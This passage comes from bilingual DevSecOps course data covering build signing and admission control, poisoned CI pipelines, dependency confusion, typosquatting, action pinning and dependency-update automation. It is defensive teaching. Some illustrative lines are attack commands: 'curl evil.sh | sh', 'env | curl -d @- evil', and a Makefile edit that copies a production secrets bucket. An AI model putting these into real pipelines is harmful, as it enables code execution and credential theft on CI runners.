        hintHi: 'SIGNING WITHOUT VERIFICATION USELESS HAI: ek signature jise KUCH nahi padhता wo DOCUMENTATION hai, CONTROL nahi. Ek fork se build, ek tampered step wala build, ek hand-pushed image — sab IDENTICALLY deploy hote hain. DEPLOY BY DIGEST, TAG NAHI: ek tag ek MUTABLE pointer hai; `myreg.io/app@sha256:<digest>` se deploy karो. ADMISSION CONTROLLER KYA CHECK KARTA HAI (policy-controller / Kyverno / Connaisseur — har Pod create intercept): (1) image ref → digest; (2) IS digest par ek VALID signature; (3) ALLOWLIST par ek identity se (exact issuer + subject); (4) ek PROVENANCE attestation + iske andar fields inspect karो (repo == your repo, builder ID); (5) optionally SBOM/scan attestation. KOI check fail → Pod REJECTED, kabhi scheduled nahi. EXACT SIGNER IDENTITY PIN KYUN: sirf issuer verify karना / `.*` regex → KISI BHI GitHub Actions run se signature accept. Public repos FORK ho sakती hain → attacker aapkा `release.yml` apne fork mein run karता hai, ek valid cert paता hai subject `github.com/attacker/app/...` ke saath → loose policy accept karती hai. FIX: EXACT issuer AND EXACT subject pin karो.',
      },
    ],

    keyTakeaways: [
      'SCANNING proves an artifact is CLEAN; SIGNING + PROVENANCE prove it is the one YOUR pipeline built from YOUR source and is UNCHANGED. These are independent — SolarWinds shipped a signed, CVE-clean, official artifact with a backdoor injected into the BUILD, source untouched. Tags are MUTABLE; a deploy that trusts "the image at this tag" trusts one push credential.',
      'BUILD PROVENANCE is a signed record — bound to the artifact DIGEST — of the source commit, the builder identity (CI platform + workflow + run), the build parameters, and the materials consumed. It MUST be generated by the build PLATFORM, not the code being built, so a compromised build step cannot write its own favourable provenance.',
      'SLSA LADDER: L0 nothing → L1 provenance EXISTS (auditable, stops no attack alone) → L2 provenance SIGNED by a hosted platform + source version-controlled (post-build tampering detectable) → L3 build runs ISOLATED/ephemeral + provenance UNFORGEABLE (signing key unreachable from build steps → a malicious build step can\'t forge it). v1.0 stops at L3. Target L2 first.',
      'SIGSTORE/COSIGN removes the long-lived key. KEYLESS: exchange the CI workflow\'s OIDC token at Fulcio for a short-lived cert bound to that identity, sign by digest, log in Rekor (public transparency log), discard the key. KEY-BASED: `generate-key-pair`, simpler but you now own + must rotate a private key. A signature is a function of the artifact\'s bytes — tamper one byte and `cosign verify` fails with "invalid signature", exit 1.',
      'SIGNING IS ONLY A CONTROL IF SOMETHING VERIFIES AT ADMISSION: deploy by DIGEST (not tag), and run an admission controller (policy-controller / Kyverno / Connaisseur) that rejects any Pod lacking a valid signature over that digest FROM THE EXACT ALLOWED IDENTITY (issuer + full subject — repo + workflow + ref) plus a provenance attestation whose recorded repo/builder match policy. A `.*` identity pattern is a real hole — anyone can fork a public repo and run its release workflow.',
    ],
    keyTakeawaysHi: [
      'SCANNING saabit karता hai ek artifact CLEAN hai; SIGNING + PROVENANCE saabit karते hain ye wo hai jо AAPKI pipeline ne AAPKE source se build kiya aur UNCHANGED hai. Ye independent hain — SolarWinds ne ek signed, CVE-clean, official artifact ship kiya ek backdoor ke saath BUILD mein inject kiya, source untouched. Tags MUTABLE hain.',
      'BUILD PROVENANCE ek signed record hai — artifact DIGEST se bound — source commit, builder identity (CI platform + workflow + run), build parameters, aur consumed materials ka. Ise build PLATFORM dwara generate hona CHAHIYE, na ki build ho rahe code dwara, taaki ek compromised build step apni favourable provenance na likh sake.',
      'SLSA LADDER: L0 kuch nahi → L1 provenance EXIST karता hai (auditable, akele koi attack nahi rोkता) → L2 provenance ek hosted platform dwara SIGNED + source version-controlled (post-build tampering detectable) → L3 build ISOLATED/ephemeral + provenance UNFORGEABLE (signing key build steps se unreachable). v1.0 L3 par rukता hai. Pehle L2 target karो.',
      'SIGSTORE/COSIGN long-lived key remove karता hai. KEYLESS: CI workflow ka OIDC token Fulcio par ek short-lived cert ke liye exchange karो, digest se sign karो, Rekor mein log karो, key discard karो. KEY-BASED: `generate-key-pair`, simpler par ab aap ek private key own + rotate karते ho. Ek signature artifact ke bytes ka ek function hai — ek byte tamper karो aur `cosign verify` fail hoता hai, exit 1.',
      'SIGNING SIRF EK CONTROL HAI AGAR KUCH ADMISSION PAR VERIFY KARTA HAI: DIGEST se deploy karो (tag nahi), aur ek admission controller (policy-controller / Kyverno / Connaisseur) chalाओ jо kisi bhi Pod ko reject karता hai jिske paas us digest par EXACT ALLOWED IDENTITY se ek valid signature nahi hai (issuer + full subject — repo + workflow + ref) plus ek provenance attestation. Ek `.*` identity pattern ek real hole hai.',
    ],
  },

  {
    slug: 'ops-poisoned-pipelines-and-dependency-update-automation',
    title: 'Poisoned Pipelines & Dependency-Update Automation',
    titleHi: 'Poisoned Pipelines Aur Dependency-Update Automation',
    description:
      'The two ways an attacker gets code into your build without touching your source: manipulating the pipeline that runs on every change, and manipulating the dependencies the pipeline pulls in. This lesson covers poisoned-pipeline execution (direct and indirect), dependency confusion and typosquatting, unpinned CI actions, and the counter-move — automated, reviewed dependency updates with Renovate or Dependabot so that pinning does not mean rotting.',
    descriptionHi:
      'Do tareeke jinse ek attacker aapke source ko touch kiye bina aapke build mein code paता hai: pipeline ko manipulate karना jо har change par run hota hai, aur dependencies ko manipulate karना jो pipeline pull karती hai. Ye lesson poisoned-pipeline execution (direct aur indirect) cover karता hai, dependency confusion aur typosquatting, unpinned CI actions, aur counter-move — Renovate ya Dependabot ke saath automated, reviewed dependency updates taaki pinning ka matlab rotting na ho.',
    difficulty: 'HARD',
    duration: 24,
    order: 6,

    analogy: {
      en: '**A print shop that will print and mail anything a customer sends, on the customer\'s letterhead, using the shop\'s postage account.** The obvious risk is a customer sending libellous copy. The subtler risk is a customer whose "print job" is a script that, when the shop\'s machine runs it, quietly also prints a batch of fraudulent invoices on the shop\'s other clients\' letterheads and mails those too — because the machine that runs the job has access to all of it. A poisoned pipeline is the same: the CI runner will execute whatever a contributor puts in the build, and it does so holding the keys to the registry, the cloud, and the signing process. And dependency confusion is a supplier who registers a company with the exact name of your trusted paper wholesaler, so your automated reorder goes to them instead.',
      hi: '**Ek print shop jо kुछ bhi print aur mail karेगा jо ek customer bhejता hai, customer ke letterhead par, shop ke postage account use karके.** Obvious risk ek customer libellous copy bhejना hai. Subtler risk ek customer hai jिska "print job" ek script hai jо, jab shop ki machine ise chalाती hai, quietly shop ke doosre clients ke letterheads par fraudulent invoices ka ek batch bhi print karता hai aur unhe bhi mail karता hai — kyunki jо machine job chalाती hai iske paas sab tak access hai. Ek poisoned pipeline wahi hai: CI runner jо bhi ek contributor build mein daalता hai use execute karेगा, aur ye aisा karता hai registry, cloud, aur signing process ki keys hold karके.',
    },

    simple: `**POISONED PIPELINE EXECUTION (PPE) — get the CI to run your code, with its creds:**
\`\`\`
DIRECT PPE:   the attacker can edit the pipeline definition itself.
   - a fork PR editing .github/workflows/*.yml  (if fork PRs run privileged)
   - a branch without protection, an unprotected .gitlab-ci.yml
   - edit a job's script to add:  curl evil.sh | sh   or   env | curl -d @- evil
INDIRECT PPE: the attacker CAN'T edit the pipeline, but the pipeline runs a file
   they CAN edit:
   - a Makefile / npm 'scripts' / build.gradle / conftest.py / a pre-commit config
   - a lint or test config the CI executes
   - a "run the linter" step that executes a config from the PR branch
=> both end the same way: attacker code runs on the runner with the registry
   token, the cloud OIDC role, the signing key material, the default-branch token.
\`\`\`

**THE FORK-PR RULES (GitHub Actions specifics, the pattern generalises):**
\`\`\`
pull_request         from a fork: NO secrets, read-only GITHUB_TOKEN, no OIDC. SAFE
                     for lint/test/scan. this is the default - keep it.
pull_request_target  runs in the BASE repo context WITH secrets, but checks out
                     the BASE ref by default. DANGER if you then explicitly check
                     out the PR head and run its code / its deps. usually a mistake.
=> privileged work (deploy, publish, sign) runs on  push  to a protected branch,
   AFTER merge + review. never on unreviewed PR code.
\`\`\`

**DEPENDENCY CONFUSION + TYPOSQUATTING — get your resolver to fetch attacker code:**
\`\`\`
CONFUSION:   you have a PRIVATE package  @acme/config  (internal registry).
   attacker publishes  @acme/config  v99.0.0 to the PUBLIC npm registry.
   your build, misconfigured, checks BOTH and picks the higher version -> public one.
   FIX: scope private packages, set the registry per-scope, use  --registry  pinning,
        or a proxy (Artifactory/Nexus) that never falls through to public for your scopes.
TYPOSQUAT:   'reqessts', 'python-dateutil' vs 'python-dateutils', 'lodahs'.
   a dev typos an install command; the malicious package has a postinstall payload.
   FIX: a lockfile (an unknown name shows in the diff), an allowlist, org-level
        package firewalls.
STARJACKING / slopsquatting (LLM-hallucinated names) are newer variants of the same.
\`\`\`

**PIN YOUR CI ACTIONS (they are dependencies too):**
\`\`\`
uses: actions/checkout@v4                      # a TAG - can be force-moved to malware
uses: actions/checkout@8ade135...              # a full commit SHA - immutable. DO THIS.
   ( + Dependabot/Renovate keeps the SHA current with a reviewable PR + a comment
     showing which version the SHA is )
also: set  permissions:  to the minimum per workflow (default read-only), pin
third-party actions especially, and review every action before adding it.
\`\`\`

**DEPENDENCY-UPDATE AUTOMATION — so "pinned" doesn't become "abandoned":**
\`\`\`
pinning WITHOUT an update process = you run known-vulnerable versions forever.
Renovate / Dependabot open a PR per update (or grouped): the diff, the changelog,
the release notes, and CI (tests + SCA + SBOM diff) all run on it. you review + merge.
config knobs: grouping, schedules (e.g. weekly), auto-merge for patch-level dev deps
  with green CI, a "stability days" delay (don't take a release < 3 days old -
  catches the compromised-release window), separate major bumps for manual review.
=> updates become small, frequent, boring, and REVIEWED - not a scary annual big-bang.
\`\`\``,

    simpleHi: `**POISONED PIPELINE EXECUTION (PPE) — CI se apna code chalvao, iske creds ke saath:**
\`\`\`
DIRECT PPE:   attacker pipeline definition khud edit kar sakта hai.
   - ek fork PR .github/workflows/*.yml edit karता hai  (agar fork PRs privileged run hoते hain)
   - ek branch bina protection ke, ek unprotected .gitlab-ci.yml
   - ek job ki script edit karके add karो:  curl evil.sh | sh   ya   env | curl -d @- evil
INDIRECT PPE: attacker pipeline edit NAHI kar sakта, par pipeline ek file chalाती hai
   jise wo edit KAR sakते hain:
   - ek Makefile / npm 'scripts' / build.gradle / conftest.py / ek pre-commit config
   - ek lint ya test config jise CI execute karता hai
=> dono same way end hote hain: attacker code runner par run hota hai registry
   token, cloud OIDC role, signing key material, default-branch token ke saath.
\`\`\`

**FORK-PR RULES (GitHub Actions specifics, pattern generalise hota hai):**
\`\`\`
pull_request         ek fork se: KOI secrets nahi, read-only GITHUB_TOKEN, koi OIDC nahi.
                     lint/test/scan ke liye SAFE. ye default hai - ise rakhो.
pull_request_target  BASE repo context mein WITH secrets run hota hai, par by default
                     BASE ref checkout karता hai. DANGER agar aap phir explicitly PR
                     head checkout karके iska code / iski deps chalाते ho.
=> privileged work (deploy, publish, sign)  push  par ek protected branch par run hota hai,
   merge + review KE BAAD. kabhi unreviewed PR code par nahi.
\`\`\`

**DEPENDENCY CONFUSION + TYPOSQUATTING — aapke resolver se attacker code fetch karvao:**
\`\`\`
CONFUSION:   aapke paas ek PRIVATE package  @acme/config  hai (internal registry).
   attacker  @acme/config  v99.0.0 PUBLIC npm registry par publish karता hai.
   aapkा build, misconfigured, DONO check karता hai aur higher version pick karता hai -> public.
   FIX: private packages scope karो, per-scope registry set karो,  --registry  pinning,
        ya ek proxy (Artifactory/Nexus) jо aapke scopes ke liye kabhi public par fall nahi hota.
TYPOSQUAT:   'reqessts', 'python-dateutil' vs 'python-dateutils', 'lodahs'.
   ek dev ek install command typo karता hai; malicious package mein ek postinstall payload hai.
   FIX: ek lockfile (ek unknown name diff mein dikhता hai), ek allowlist, org-level firewalls.
\`\`\`

**APNE CI ACTIONS PIN KARO (wo bhi dependencies hain):**
\`\`\`
uses: actions/checkout@v4                      # ek TAG - malware par force-move ho sakता hai
uses: actions/checkout@8ade135...              # ek full commit SHA - immutable. YE KARO.
   ( + Dependabot/Renovate SHA ko current rakhता hai ek reviewable PR + ek comment ke saath )
saath: har workflow ke liye  permissions:  ko minimum set karो (default read-only), pin
third-party actions especially, aur add karने se pehle har action review karो.
\`\`\`

**DEPENDENCY-UPDATE AUTOMATION — taaki "pinned" "abandoned" na bane:**
\`\`\`
pinning BINA ek update process ke = aap known-vulnerable versions hamesha ke liye chalाते ho.
Renovate / Dependabot per update ek PR kholते hain (ya grouped): diff, changelog,
release notes, aur CI (tests + SCA + SBOM diff) sab ispar run hote hain. aap review + merge.
config knobs: grouping, schedules (e.g. weekly), patch-level dev deps ke liye auto-merge
  green CI ke saath, ek "stability days" delay (ek release < 3 din purani mat lो -
  compromised-release window catch karता hai), manual review ke liye separate major bumps.
=> updates chhote, frequent, boring, aur REVIEWED ban jaते hain - ek scary annual big-bang nahi.
\`\`\``,

    content: `## Poisoned pipeline execution

There are two ways to get malicious code into a build without modifying the application source, and the first is to get the CI system to run code you control. This is called poisoned pipeline execution and it comes in two forms. In direct PPE the attacker can edit the pipeline definition itself: a fork pull request that modifies a workflow file in a repository where fork PRs run with privileges, a branch without protection rules, an unprotected \`.gitlab-ci.yml\`. They add a line to a job — pull and execute a remote script, or pipe the environment to an external collector — and it runs. In indirect PPE the attacker cannot edit the pipeline, but the pipeline runs a file that they can edit: a Makefile, an npm \`scripts\` block, a Gradle build file, a test configuration, a linter configuration, a pre-commit hook definition. If a CI job runs "the linter" or "the tests" or "make build" and any of the configuration for those comes from the pull request branch, then a pull request that changes that configuration is running attacker code. Both forms end identically: code the attacker wrote executes on the runner, and the runner holds the registry push token, the cloud OIDC role, the artifact-signing key material, and a token that can push to the default branch.

## Fork pull request rules

The concrete rules are platform-specific but the pattern is universal. On GitHub Actions, a \`pull_request\` trigger from a fork runs with no repository secrets, a read-only \`GITHUB_TOKEN\`, and no OIDC — which makes it safe to run lint, tests, and scanners on untrusted code, and this is the default that should be preserved. The \`pull_request_target\` trigger is the dangerous one: it runs in the context of the base repository with access to secrets, and while it checks out the base branch by default, the common mistake is to then explicitly check out the pull request\'s head commit and run its code or install its dependencies — which hands the fork\'s code the base repository\'s secrets. The safe structure is that anything privileged — deploying, publishing a package, signing an artifact — runs only on a \`push\` event to a protected branch, after the change has been merged and therefore reviewed, and never against the code in an unreviewed pull request.

## Dependency confusion and typosquatting

The second way in is through the dependency resolver. Dependency confusion exploits a build configured to consult both a private registry and the public one: if your organisation has an internal package called \`@acme/config\` published only to your private registry, an attacker publishes a package with the exact same name to the public npm registry at a very high version number, and a resolver that checks both sources and takes the highest version pulls the attacker\'s public package into your build. The defence is to make private scopes unambiguous — configure the resolver so that anything under \`@acme/\` comes only from the private registry, never the public one — ideally enforced by a proxy like Artifactory or Nexus that never falls through to the public registry for your namespaces. Typosquatting is simpler: an attacker registers a package whose name is a plausible misspelling of a popular one — \`reqessts\`, \`python-dateutils\`, \`lodahs\` — with a malicious install script, and waits for someone to typo an install command. A committed lockfile is a strong defence because an unexpected package name appears in the lockfile diff for review; an install-time allowlist and org-level package firewalls add more. LLM-hallucinated package names — a model confidently suggests \`pip install\` for a package that does not exist, and an attacker registers it — are a newer variant of the same problem.

## Pin your CI actions

A CI action or plugin is a dependency, executed with the pipeline\'s privileges, and it should be pinned like any other. Referencing \`actions/checkout@v4\` pins to a tag, and a tag is a mutable pointer that the action\'s maintainer — or anyone who compromises their account — can move to a different commit, including a malicious one, without you changing anything. Referencing \`actions/checkout@8ade135...\` with the full commit SHA pins to an immutable object. The operational cost of SHA pinning is that the SHA does not tell you which version it is, which is solved by letting Dependabot or Renovate keep the pins current through reviewable pull requests that include a comment showing the version each SHA corresponds to. Alongside pinning, set each workflow\'s \`permissions\` to the minimum it needs — the default should be read-only — pin third-party actions especially rigorously, and review the source of any action before adding it, because \`uses:\` is running someone else\'s code in your privileged context.

## Dependency-update automation

Pinning every dependency to an exact version and a hash, as Lesson 2 recommends, has a failure mode: without a process to move the pins forward, you end up running known-vulnerable old versions indefinitely, because the safest-feeling action is always to change nothing. Renovate and Dependabot solve this by making updates continuous and reviewable. They open a pull request for each available update, or for a group of related updates, and that pull request carries the version change, links to the changelog and release notes, and runs through your full CI including tests, the SCA scan, and an SBOM diff — so you review a small, well-documented change with evidence attached, and merge it. The configuration options that matter: grouping related packages so you get one PR instead of forty; a schedule such as weekly so the PRs arrive predictably; auto-merge for patch-level updates to development dependencies when CI is green; a "stability days" or "minimum release age" setting that refuses to propose a release less than a few days old, which sidesteps the window in which a compromised release is live but not yet caught; and separating major-version bumps for deliberate manual review since those carry breaking changes. The effect is that dependency updates become small, frequent, boring, and reviewed, instead of a large, risky, annual migration that the team dreads and therefore defers.`,

    contentHi: `## Poisoned pipeline execution

Ek build mein malicious code paने ke do tareeke hain bina application source modify kiye, aur pehla CI system se code chalvana hai jise aap control karते ho. Ise poisoned pipeline execution kehते hain aur ye do forms mein aata hai. Direct PPE mein attacker pipeline definition khud edit kar sakता hai: ek fork pull request jо ek workflow file modify karता hai ek repository mein jahaan fork PRs privileges ke saath run hote hain, ek branch bina protection rules ke, ek unprotected \`.gitlab-ci.yml\`. Wo ek job mein ek line add karते hain aur ye run hota hai. Indirect PPE mein attacker pipeline edit nahi kar sakता, par pipeline ek file chalाती hai jise wo edit kar sakते hain: ek Makefile, ek npm \`scripts\` block, ek Gradle build file, ek test configuration, ek linter configuration. Agmar ek CI job "the linter" ya "the tests" ya "make build" chalाता hai aur un ke liye koi configuration pull request branch se aati hai, to ek pull request jо us configuration ko change karता hai attacker code chalा raha hai. Dono forms identically end hote hain: attacker ne jо code likha wo runner par execute hota hai, aur runner registry push token, cloud OIDC role, artifact-signing key material hold karता hai.

## Fork pull request rules

Concrete rules platform-specific hain par pattern universal hai. GitHub Actions par, ek fork se ek \`pull_request\` trigger koi repository secrets ke bina run hota hai, ek read-only \`GITHUB_TOKEN\`, aur koi OIDC nahi — jо ise untrusted code par lint, tests, aur scanners chalाना safe banाता hai, aur ye default hai jise preserve karna chahिए. \`pull_request_target\` trigger dangerous wala hai: ye base repository ke context mein secrets tak access ke saath run hota hai, aur jabki ye by default base branch checkout karता hai, common mistake phir explicitly pull request ka head commit checkout karना aur iska code ya iski dependencies install karना hai. Safe structure ye hai ki kुछ bhi privileged — deploying, ek package publish karna, ek artifact sign karna — sirf ek protected branch par ek \`push\` event par run hota hai, change merge hone ke baad.

## Dependency confusion aur typosquatting

Doosra tareeka dependency resolver ke through hai. Dependency confusion ek build ko exploit karता hai jо dono ek private registry aur public one consult karने ke liye configured hai: agmar aapki organisation ke paas ek internal package \`@acme/config\` hai jо sirf aapke private registry par published hai, ek attacker exact same name ke saath ek package public npm registry par ek bahut high version number par publish karता hai, aur ek resolver jо dono sources check karता hai aur highest version leता hai attacker ka public package aapke build mein pull karता hai. Defence private scopes ko unambiguous banaना hai. Typosquatting simpler hai: ek attacker ek package register karता hai jिska naam ek popular one ki ek plausible misspelling hai — \`reqessts\`, \`python-dateutils\`, \`lodahs\` — ek malicious install script ke saath. Ek committed lockfile ek strong defence hai kyunki ek unexpected package name lockfile diff mein appear hota hai.

## Apne CI actions pin karo

Ek CI action ya plugin ek dependency hai, pipeline ke privileges ke saath executed, aur ise kisi bhi doosre ki tarah pinned hona chahिए. \`actions/checkout@v4\` reference karना ek tag par pin karता hai, aur ek tag ek mutable pointer hai jise action ka maintainer — ya jо bhi unka account compromise karता hai — ek alag commit par move kar sakता hai. \`actions/checkout@8ade135...\` full commit SHA ke saath reference karना ek immutable object par pin karता hai. SHA pinning ki operational cost ye hai ki SHA aapko nahi batाता ki ye konsी version hai, jо Dependabot ya Renovate ko pins current rakhने de kar solve kiya jaता hai. Pinning ke alongside, har workflow ke \`permissions\` ko minimum set karो.

## Dependency-update automation

Har dependency ko ek exact version aur ek hash par pin karना, jaise Lesson 2 recommend karता hai, ek failure mode hai: pins ko aage move karने ke ek process ke bina, aap known-vulnerable purani versions indefinitely chalाते ho. Renovate aur Dependabot ise updates ko continuous aur reviewable banaकर solve karते hain. Wo har available update ke liye ek pull request kholते hain, aur wo pull request version change carry karता hai, changelog aur release notes ko link karता hai, aur aapke full CI ke through run hota hai. Config options jо matter karते hain: related packages grouping, ek schedule jaise weekly, development dependencies ke patch-level updates ke liye auto-merge jab CI green hai, ek "stability days" setting jо ek release kुछ din se kam purani propose karने se refuse karता hai, aur deliberate manual review ke liye major-version bumps separate karना. Effect ye hai ki dependency updates chhote, frequent, boring, aur reviewed ban jaते hain.`,

    examples: [
      {
        title: 'The two poisoned-pipeline shapes and a hardened workflow, side by side',
        titleHi: 'Do poisoned-pipeline shapes aur ek hardened workflow, side by side',
        code: `# (prose worked example - reviewing a real workflow for PPE + supply-chain exposure)
# =============================================================================
# VULNERABLE workflow (.github/workflows/ci.yml):
# ---------------------------------------------------------------------------
# on: pull_request_target                 # <-- (1) runs WITH secrets, on fork PRs
# jobs:
#   build:
#     permissions: write-all              # <-- (2) every token, maximally scoped
#     steps:
#       - uses: actions/checkout@v3
#         with: { ref: \${{ github.event.pull_request.head.sha }} }   # <-- (3) checks
#                                          #     out UNTRUSTED PR code, now with secrets
#       - uses: some-org/setup-tool@main   # <-- (4) 3rd-party action, unpinned, @main
#       - run: make ci                     # <-- (5) runs Makefile FROM the PR branch
#         env:
#           AWS_ROLE: \${{ secrets.DEPLOY_ROLE_ARN }}   # <-- (6) prod cred to PR code
#
# ATTACK: a fork PR edits the 'ci' target in the Makefile to
#   'aws sts get-caller-identity; aws s3 cp s3://acme-prod-secrets/ . --recursive'
# -> runs on the runner, authenticated as DEPLOY_ROLE_ARN. done.
# (indirect PPE via (5)+(3); (1) is what makes the secret available; (2) widens it.)
#
# ---------------------------------------------------------------------------
# HARDENED (.github/workflows/ci.yml + release.yml split):
# ---------------------------------------------------------------------------
# # ci.yml  - runs on untrusted PR code, so: ZERO credentials
# on: pull_request                        # fork PRs: no secrets, read-only token
# permissions: { contents: read }         # explicit least privilege
# jobs:
#   test:
#     steps:
#       - uses: actions/checkout@11bd719... # full SHA (Renovate keeps it current)
#       - uses: some-org/setup-tool@a1b2c3... # 3rd-party: SHA-pinned + reviewed
#       - run: make ci                     # PR's Makefile runs, but with NOTHING to steal
#
# # release.yml - privileged, but only on trusted (merged) code
# on: { push: { branches: [main] } }      # after merge + review only
# permissions: { contents: read, id-token: write }   # OIDC, nothing else
# jobs:
#   release:
#     environment: production              # required reviewers + a deploy log
#     steps:
#       - uses: actions/checkout@11bd719...
#       - uses: aws-actions/configure-aws-credentials@... # short-lived, scoped role
#       - run: ./scripts/release.sh        # a script from main, not from a PR
# =============================================================================
echo "vulnerable: 6 findings (pull_request_target + PR-head checkout + write-all + unpinned + Makefile-from-PR + secret)"
echo "hardened:   PR job has zero secrets; release job runs only post-merge with a scoped OIDC role"`,
        output: `vulnerable: 6 findings (pull_request_target + PR-head checkout + write-all + unpinned + Makefile-from-PR + secret)
hardened:   PR job has zero secrets; release job runs only post-merge with a scoped OIDC role`,
        explain: 'The vulnerable workflow combines every mistake that enables poisoned pipeline execution. It triggers on \`pull_request_target\`, which runs in the base repository\'s context with secrets available even for pull requests from forks; it grants \`write-all\` permissions, so every token is maximally scoped; it then explicitly checks out the pull request\'s head commit, so the untrusted fork code is now on disk in a context that has secrets; it uses a third-party action pinned to a moving \`@main\`; and it runs \`make ci\`, executing a Makefile that came from the pull request branch, with a production AWS role in the environment. A fork contributor edits the \`ci\` target in the Makefile to exfiltrate credentials and opens a pull request; the runner executes it authenticated as the deploy role. The hardened version splits the workflow: the CI job runs on the ordinary \`pull_request\` trigger with no secrets and read-only permissions, so the fork\'s Makefile still runs but has nothing to steal; the release job runs only on \`push\` to \`main\` — after merge and review — with an OIDC-issued scoped role, an environment gate with required reviewers, and a release script that lives on the main branch rather than coming from a pull request. Actions are pinned to full commit SHAs kept current by Renovate.',
        explainHi: 'Vulnerable workflow har mistake combine karता hai jо poisoned pipeline execution enable karती hai. Ye \`pull_request_target\` par trigger hota hai, jо base repository ke context mein secrets available ke saath run hota hai forks se pull requests ke liye bhi; ye \`write-all\` permissions grant karता hai; ye phir explicitly pull request ka head commit checkout karता hai, to untrusted fork code ab disk par ek context mein hai jिske paas secrets hain; ye ek third-party action use karता hai jо ek moving \`@main\` par pinned hai; aur ye \`make ci\` chalाता hai, ek Makefile execute karता hai jо pull request branch se aaya, ek production AWS role ke saath environment mein. Ek fork contributor Makefile mein \`ci\` target edit karता hai credentials exfiltrate karने ke liye. Hardened version workflow ko split karता hai: CI job ordinary \`pull_request\` trigger par run hota hai koi secrets aur read-only permissions ke bina; release job sirf \`main\` par \`push\` par run hota hai — merge aur review ke baad.',
      },
    ],

    mistakes: [
      {
        wrong: `# "our CI is internal, contributors are trusted" - no branch protection, no
# review required on workflow files, one shared deploy key in a repo secret
  # anyone in the org (200 engineers) can push to any branch
  # .github/workflows/*.yml is not in CODEOWNERS
  # secrets.DEPLOY_KEY is a long-lived key with prod write, used by ci.yml
  #
  # an attacker phishes ONE engineer's GitHub token (or an engineer's laptop is
  # compromised, or an insider). with that one account they:
  #   - push a branch that edits ci.yml to dump secrets.DEPLOY_KEY
  #   - or edit the shared Makefile the CI runs
  # -> full prod access from a single compromised low-privilege developer account.
  # the pipeline had no defense in depth: one account == game over.`,
        right: `# treat CI like prod: protected branches, CODEOWNERS on workflows, OIDC, envs
  # 1. branch protection on main + release/*: required review, no force-push,
  #    required status checks, no bypass (even for admins).
  # 2. CODEOWNERS:  /.github/  @acme/platform-security   (workflow edits need their review)
  # 3. no long-lived deploy keys. deploy uses OIDC -> a short-lived role scoped to
  #    exactly the deploy actions, 15-min sessions, assertible on the workflow identity.
  # 4. GitHub 'environment: production' with required reviewers -> a human approves
  #    each deploy, and it's logged.
  # 5. least-privilege GITHUB_TOKEN: 'permissions: contents: read' by default,
  #    widen per-job only where needed.
  # now one compromised dev account can open a PR (good - that's the point) but
  # cannot merge a workflow change unreviewed, cannot assume the deploy role from
  # a PR, and cannot deploy without a second human.`,
        why: 'Treating the CI system as internal infrastructure that trusted colleagues use, rather than as a production system, means its security rests entirely on every contributor account staying uncompromised — and contributor accounts get phished, laptops get infected, and insiders exist. If a single developer account can push a branch that edits a workflow file, or edit a shared build script that CI executes, and CI holds a long-lived production deployment key, then compromising any one of those accounts yields full production access with no further obstacle. Defence in depth means no single account compromise is sufficient. Branch protection with required review and no admin bypass means a malicious workflow edit cannot merge without a second person approving it. Code owners on the workflow directory routes those approvals to a security-aware team. Replacing long-lived deploy keys with OIDC-issued short-lived roles scoped to the deploy actions means a stolen repository secret is not a standing production credential. An environment gate with required reviewers puts a human approval and an audit record on every deploy. And a read-only default token means a compromised job cannot use the pipeline\'s own credentials to escalate. Each control is bypassable alone; together they mean an attacker needs to compromise multiple independent things.',
        whyHi: 'CI system ko internal infrastructure ke roop mein treat karना jise trusted colleagues use karते hain, ek production system ke bजाy, ka matlab iski security poori tarah har contributor account ke uncompromised rehне par rests karती hai — aur contributor accounts phished ho jaते hain, laptops infected ho jaते hain, aur insiders exist karते hain. Agmar ek single developer account ek branch push kar sakता hai jо ek workflow file edit karता hai, aur CI ek long-lived production deployment key hold karता hai, to un accounts mein se kisi ek ko compromise karना full production access yield karता hai bina kisi further obstacle ke. Defence in depth ka matlab koi single account compromise sufficient nahi hai. Branch protection required review ke saath. Workflow directory par code owners. Long-lived deploy keys ko OIDC-issued short-lived roles se replace karना. Ek environment gate required reviewers ke saath. Har control akele bypassable hai; ek saath wo matlab ek attacker ko multiple independent cheezein compromise karना padta hai.',
      },
      {
        wrong: `# private packages, but the build can reach the public registry for those names
  # .npmrc:   registry=https://registry.npmjs.org/    (only)
  # package.json:   "dependencies": { "@acme/logger": "^2.0.0", ... }
  # @acme/logger is published ONLY to the internal Verdaccio at npm.acme.internal
  # the build works because... someone also mirrored it to npmjs? no - it's private.
  # actually the build has been failing intermittently and people retry it.
  #
  # an attacker publishes @acme/logger@99.0.0 to the PUBLIC npmjs, with a
  # postinstall that beacons out. next 'npm install' on a fresh cache resolves
  # @acme/logger from npmjs (it's "newer"), runs the postinstall on the CI runner.`,
        right: `# bind each private scope to the private registry; proxy everything else
  # .npmrc:
  #   @acme:registry=https://npm.acme.internal/         # @acme/* ONLY from here
  #   registry=https://npm.acme.internal/               # everything else via the proxy
  #   //npm.acme.internal/:_authToken=\${NPM_TOKEN}
  # the proxy (Verdaccio/Artifactory/Nexus):
  #   - serves @acme/* from the internal store, NEVER falls through to npmjs
  #   - caches public packages, but a "scope not found" for @acme/* is an ERROR,
  #     not a fallthrough to the public registry
  # + publish a placeholder @acme/* package name on the PUBLIC registry to reserve it
  # + a lockfile, so a resolution change to a public source shows in the diff
  # + 'npm config get @acme:registry' asserted in CI`,
        why: 'Dependency confusion works when a package name your build depends on can be resolved from more than one source and the resolver picks the higher version number without regard to which source it came from. If \`@acme/logger\` is a private package but your resolver configuration allows it to also be looked up on the public registry, an attacker who publishes \`@acme/logger\` publicly at version 99 wins the version comparison, and their package — with whatever install script it carries — is what gets installed on the next clean resolve, including on the CI runner. The fix is to make the scope unambiguous: configure the resolver so that anything under the \`@acme/\` scope is fetched only from the internal registry, and route all other traffic through a proxy that serves public packages from its cache but treats a missing \`@acme/\` package as an error rather than falling through to the public registry. Reserving your organisation\'s scope names on the public registry with placeholder packages closes the gap further, a committed lockfile makes any change in resolution source visible in review, and asserting the registry configuration in CI catches drift.',
